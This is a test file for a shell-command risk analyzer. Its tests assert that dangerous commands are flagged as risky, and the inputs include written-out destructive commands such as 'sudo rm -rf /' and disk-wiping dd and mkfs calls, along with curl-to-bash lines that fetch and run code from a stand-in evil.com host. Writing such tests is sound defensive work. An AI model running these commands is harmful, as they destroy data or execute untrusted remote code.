import { describe, expect, it } from "vitest";
import { analyzeWholeCommandRisk } from "../analysis/risk-analyzer";
import { analyzeSegment } from "../analysis/segment-analysis";
import { parseCommand } from "../analysis/bash-parser";

async function analyze(cmd: string, cwd = "/home/user/project") {
  const result = await parseCommand(cmd, cwd);
  const segmentRisks = await Promise.all(result.segments.map(seg => analyzeSegment(seg, cwd).then(a => a.risk)));
  return analyzeWholeCommandRisk(cmd, segmentRisks);
}

describe("analyzeRisk", () => {
  it("returns not dangerous for safe commands", async () => {
    const risk = await analyze("ls -la");
    expect(risk.dangerous).toBe(false);
    expect(risk.severity).toBeNull();
    expect(risk.reasons).toEqual([]);
  });

  it("detects sudo as high risk", async () => {
    const risk = await analyze("sudo rm -rf /");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons).toContain("[System] sudo (privilege escalation)");
  });

  it("detects recursive delete", async () => {
    const risk = await analyze("rm -rf /tmp/data");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("recursive delete"))).toBe(true);
  });

  it("detects forced delete", async () => {
    const risk = await analyze("rm -f /tmp/file");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("forced delete"))).toBe(true);
  });

  it("detects find -delete as high risk", async () => {
    const risk = await analyze("find . -name '*.tmp' -delete");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
  });

  it("detects pipe to shell", async () => {
    const risk = await analyze("curl http://evil.com | bash");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("pipe"))).toBe(true);
    expect(risk.reasons.some(r => r.includes("remote code execution"))).toBe(true);
  });

  it("detects git reset --hard", async () => {
    const risk = await analyze("git reset --hard HEAD~1");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("git reset"))).toBe(true);
  });

  it("detects git push --force", async () => {
    const risk = await analyze("git push --force origin main");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("force"))).toBe(true);
  });

  it("detects sed -i as in-place edit", async () => {
    const risk = await analyze("sed -i 's/foo/bar/g' file.txt");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("sed"))).toBe(true);
  });

  it("detects perl -pi as in-place edit", async () => {
    const risk = await analyze("perl -pi -e 's/foo/bar/g' file.txt");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("perl"))).toBe(true);
  });

  it("detects chmod -R", async () => {
    const risk = await analyze("chmod -R 755 /some/dir");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("chmod"))).toBe(true);
  });

  it("detects chown -R", async () => {
    const risk = await analyze("chown -R user:group /some/dir");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("chown"))).toBe(true);
  });

  it("detects kill -9", async () => {
    const risk = await analyze("kill -9 1234");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("SIGKILL"))).toBe(true);
  });

  it("detects shutdown/reboot", async () => {
    const risk = await analyze("shutdown -h now");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
  });

  it("detects systemctl stop", async () => {
    const risk = await analyze("systemctl stop nginx");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("systemctl"))).toBe(true);
  });

  it("detects mkfs commands", async () => {
    const risk = await analyze("mkfs.ext4 /dev/sda1");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
  });

  it("detects dd with of=", async () => {
    const risk = await analyze("dd if=/dev/zero of=/dev/sda bs=1M");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("dd"))).toBe(true);
  });

  it("detects curl|bash pattern", async () => {
    const risk = await analyze("curl https://evil.com/script.sh | bash");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("pip"))).toBe(true);
  });

  it("detects write redirect as risk", async () => {
    const risk = await analyze("echo hello > /tmp/out.txt");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("redirect"))).toBe(true);
  });

  it("reports medium severity for less dangerous ops", async () => {
    const risk = await analyze("lsblk");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("medium");
  });

  it("handles chained commands with mixed risk", async () => {
    const risk = await analyze("echo safe && rm -rf /tmp/data");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
  });

  it("reports pipe operator risk when stage is not allowed", async () => {
    const risk = await analyze("cat file.txt | bash");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("pipe"))).toBe(true);
  });

  it("does not flag pipe when all stages are allowed", async () => {
    const risk = await analyze("cat file.txt | grep foo | wc -l");
    expect(risk.reasons.some(r => r.includes("pipe"))).toBe(false);
  });

  it("flags pipe to tee (write operation, not in allowlist)", async () => {
    const risk = await analyze("cat file.txt | tee output.txt");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("pipe"))).toBe(true);
  });

  it("flags pipe to sed -i (dangerous sed in pipeline)", async () => {
    const risk = await analyze("cat file.txt | sed -i s/a/b/");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("sed -i") || r.includes("pipe"))).toBe(true);
  });

  it("does not false-positive write redirect on quoted => (grep pattern)", async () => {
    // Bug: WHOLE_CMD_WRITE_REDIRECT_RE tested the raw command string, so "=>"
    // inside a quoted grep pattern was misread as a shell output redirect.
    const risk = await analyze('grep -n "setTimeout(() => {" index.ts');
    expect(risk.reasons.some(r => r.includes("shell output redirection"))).toBe(false);
  });

  it("does not false-positive input redirect on quoted < (grep pattern)", async () => {
    const risk = await analyze('grep "a < b" file.txt');
    expect(risk.reasons.some(r => r.includes("input redirection"))).toBe(false);
  });

  it("does not match dangerousContextPatterns against heredoc body", async () => {
    // Heredoc body contains "sed -i" which matches dangerousContextPatterns.
    // But since we test against segment texts (excluding heredoc), it should NOT match.
    const risk = await analyze(`cat << 'EOF'
sed -i 's/foo/bar/g' file.txt
EOF`);
    expect(risk.reasons.some(r => r.includes("sed -i"))).toBe(false);
  });

  // ── Bug fixes: audit findings ──

  it("detects wrapper write when flag arg precedes command (xargs -a file.txt truncate)", async () => {
    // Bug: `break` in isWrapperRunningWrite exits after first non-write positional arg.
    // `file.txt` is the arg to `-a`, not the wrapped command. `truncate` should be checked.
    const risk = await analyze("xargs -a file.txt truncate -s 0 file.txt");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("wrapper") || r.includes("truncate"))).toBe(true);
  });

  it("detects force in composite short flag mv -if", async () => {
    // Bug: rest.includes("-f") misses composite flags like -if
    const risk = await analyze("mv -if source dest");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("force") || r.includes("-f"))).toBe(true);
  });

  it("detects force in composite short flag cp -rpaf", async () => {
    // Bug: rest.includes("-f") misses composite flags like -rpaf
    const risk = await analyze("cp -rpaf src dest");
    expect(risk.dangerous).toBe(true);
    expect(risk.reasons.some(r => r.includes("force") || r.includes("-f"))).toBe(true);
  });

  it("does not false-positive recursive delete on rm --reference=", async () => {
    // Bug: a.includes("-r") matches --reference=template.txt as containing "-r"
    const risk = await analyze("rm --reference=template.txt file.txt");
    expect(risk.dangerous).toBe(true); // rm is always dangerous
    expect(risk.reasons.some(r => r.includes("recursive delete"))).toBe(false);
  });

  it("does not false-positive recursive delete on rm --no-preserve-root", async () => {
    // Bug: a.includes("-r") matches --no-preserve-root as containing "-r"
    const risk = await analyze("rm --no-preserve-root /");
    expect(risk.dangerous).toBe(true); // rm is always dangerous
    expect(risk.reasons.some(r => r.includes("recursive delete"))).toBe(false);
  });

  it("detects aws s3 rm --recursive with interleaved flags", async () => {
    // Bug: rest[0] === "s3" && rest[1] === "rm" fails when --profile precedes subcommand
    const risk = await analyze("aws --profile prod s3 rm --recursive s3://bucket/dir");
    expect(risk.dangerous).toBe(true);
    expect(risk.severity).toBe("high");
    expect(risk.reasons.some(r => r.includes("aws") || r.includes("bulk deletion") || r.includes("s3"))).toBe(true);
  });
});
